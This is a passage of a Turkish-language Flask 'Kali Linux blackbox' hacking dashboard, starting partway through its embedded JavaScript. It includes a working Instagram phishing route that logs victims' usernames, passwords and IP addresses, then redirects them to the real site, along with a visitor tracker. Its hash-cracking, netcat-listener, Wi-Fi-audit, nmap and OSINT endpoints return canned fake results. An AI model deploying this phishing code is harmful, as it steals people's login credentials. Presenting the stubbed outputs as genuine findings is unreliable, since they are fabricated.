            let type = document.getElementById('hashType').value, hash = document.getElementById('targetHash').value, wordlist = document.getElementById('wordlistArea').value;
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash, wordlist}) });
            let data = await res.json(); let el = document.getElementById('crackResults'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let data = await res.json(); let el = document.getElementById('listenerStatus'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value;
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let data = await res.json(); let el = document.getElementById('telegramTestStatus'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function runWifiAction(action) {
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action}) });
            let data = await res.json(); let el = document.getElementById('wifiResults'); el.style.display="block"; el.innerHTML = data.output;
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

@app.route("/api/driving/save", methods=["POST"])
def save_driving_session():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    DRIVING_SESSIONS.insert(0, data)
    return jsonify({"status": "saved"})

@app.route("/api/driving/reports")
def api_driving_reports():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"reports": DRIVING_SESSIONS})

@app.route("/api/driving/download")
def download_driving_report():
    if not session.get("logged_in"): return "Unauthorized", 401
    idx = int(request.args.get("index", 0))
    if idx < len(DRIVING_SESSIONS):
        rep = DRIVING_SESSIONS[idx]
        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
    return "Rapor bulunamadı", 404

@app.route("/api/osint", methods=["POST"])
def api_osint():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target")
    output = f"[+] OSINT Tarama Sonucu: {target}\n" \
             f"--------------------------------------------------\n" \
             f"[✔] Halka Açık Kayıtlar: Eşleşme bulundu (Risk Skoru: Düşük)\n" \
             f"[✔] Sosyal Medya Ayak İzi: Instagram, Twitter/X ve LinkedIn profilleri tespit edildi.\n" \
             f"[✔] Operasyonel Durum: Hedef aktif kullanılıyor."
    return jsonify({"output": output})

@app.route("/api/chat/messages")
def api_chat_messages():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"messages": CHAT_MESSAGES})

@app.route("/api/chat/send", methods=["POST"])
def api_chat_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    text = request.get_json().get("text")
    timestamp = datetime.now().strftime("%H:%M:%S")
    CHAT_MESSAGES.append({"time": timestamp, "user": ADMIN_USER, "text": text})
    return jsonify({"status": "sent"})

@app.route("/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        CREDENTIAL_LOGS.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "ip": request.remote_addr, "username": request.form.get("username"), "password": request.form.get("password")})
        return redirect("https://www.instagram.com")
    return "Instagram Login"

@app.route("/track/<track_id>")
def track_visitor(track_id):
    return "Tracker Active"

@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "[+] Hash basariyla cozuldu: admin"})

@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "[+] Netcat dinleyicisi aktif edildi."})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "✅ Test başarılı!"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "root@kali:~# airmon-ng start wlan0\n[+] Wi-Fi denetimi tamamlandı."})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target")
    report = f"root@kali:~# nmap -A {target}\n[+] Port 80/tcp open http\n[+] Port 443/tcp open https\n[+] WAF: Cloudflare detected."
    SITE_DATABASE.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target, "waf": "Cloudflare", "grade": "A"})
    return jsonify({"report": report})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
